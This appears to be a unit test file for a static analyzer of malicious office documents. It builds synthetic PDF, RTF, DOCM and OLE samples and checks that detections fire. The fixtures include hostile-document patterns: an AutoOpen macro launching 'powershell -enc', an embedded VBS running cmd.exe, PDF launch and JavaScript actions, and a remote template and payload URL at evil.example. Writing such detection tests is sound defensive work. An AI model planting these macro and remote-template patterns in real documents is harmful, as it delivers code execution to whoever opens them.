from __future__ import annotations

import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from moda.core.engine import AnalyzerEngine
from moda.analyzers.ole import OLEAnalyzer
from moda.core.context import AnalysisContext


def analyze_bytes(file_name: str, data: bytes):
    with tempfile.TemporaryDirectory() as temp_dir:
        sample = Path(temp_dir) / file_name
        sample.write_bytes(data)
        return AnalyzerEngine(skip_yara=True).analyze_file(sample)


def build_ooxml(path: Path, files: dict[str, str | bytes]) -> None:
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        archive.writestr(
            "word/document.xml",
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
        )
        for name, data in files.items():
            archive.writestr(name, data)


class StaticAnalyzerTests(unittest.TestCase):
    def test_pdf_suspicious_actions_are_flagged(self) -> None:
        result = analyze_bytes(
            "suspicious.pdf",
            (
                b"%PDF-1.7\n"
                b"1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) "
                b"/JavaScript 3 0 R /Launch << >> /EmbeddedFile << >> "
                b"/URI (http://evil.example/payload) >> endobj\n%%EOF"
            ),
        )

        titles = {finding.title for finding in result.findings}
        self.assertIn("PDF JavaScript", titles)
        self.assertIn("PDF OpenAction", titles)
        self.assertIn("PDF Launch Action", titles)
        self.assertIn("PDF Embedded File", titles)
        self.assertEqual(result.risk_level, "critical")

    def test_rtf_embedded_object_and_exploit_hints_are_flagged(self) -> None:
        result = analyze_bytes(
            "exploit.rtf",
            ("{\\rtf1{\\object\\objclass Equation.3{\\objdata " + "41" * 300 + "}}}").encode(),
        )

        titles = {finding.title for finding in result.findings}
        self.assertIn("RTF Embedded Object Data", titles)
        self.assertIn("RTF Exploit Indicator", titles)
        self.assertIn("Large RTF Hex Blob", titles)

    def test_ooxml_remote_relationship_and_macro_patterns_are_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "remote_macro.docm"
            build_ooxml(
                sample,
                {
                    "word/_rels/document.xml.rels": (
                        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                        '<Relationship Id="rId1" '
                        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                        'Target="http://evil.example/template.dotm" TargetMode="External"/>'
                        "</Relationships>"
                    ),
                    "word/vbaProject.bin": (
                        'Sub AutoOpen()\n'
                        'CreateObject("WScript.Shell").Run "powershell -enc AAAA"\n'
                        "End Sub"
                    ).encode(),
                },
            )
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertIn("VBA Macros Present", titles)
        self.assertIn("Macro Auto-Execution Trigger", titles)
        self.assertIn("Macro Process Execution", titles)
        self.assertIn("Remote Document Relationships", titles)

    def test_ooxml_embedded_script_is_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "embedded.docx"
            build_ooxml(
                sample,
                {"word/embeddings/payload.vbs": 'CreateObject("WScript.Shell").Run "cmd.exe /c calc"'},
            )
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertIn("Embedded Script", titles)
        self.assertEqual(result.risk_level, "high")

    def test_ole_helper_flags_vba_objectpool_and_activex(self) -> None:
        class FakeStream:
            def read(self) -> bytes:
                return b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub"

        class FakeOLE:
            def listdir(self):
                return [
                    ["Macros", "VBA", "Module1"],
                    ["ObjectPool", "_123456"],
                    ["ActiveX", "Control1"],
                    ["Package"],
                ]

            def exists(self, path: str) -> bool:
                return path in {"Macros/VBA", "VBA/dir"}

            def openstream(self, stream):
                return FakeStream()

        context = AnalysisContext("sample.doc", b"\xd0\xcf\x11\xe0" + b"\x00" * 512)
        analyzer = OLEAnalyzer()
        analyzer._inspect_streams(context, FakeOLE())
        analyzer._check_vba_storage(context, FakeOLE())
        analyzer._check_activex(context, FakeOLE())

        titles = {finding.title for finding in context.findings}
        self.assertIn("OLE Object Pool", titles)
        self.assertIn("OLE Embedded Package Stream", titles)
        self.assertIn("VBA Macros Present", titles)
        self.assertIn("ActiveX Controls Present", titles)
        self.assertIn("AutoOpen", "\n".join(context.macro_code))


if __name__ == "__main__":
    unittest.main()
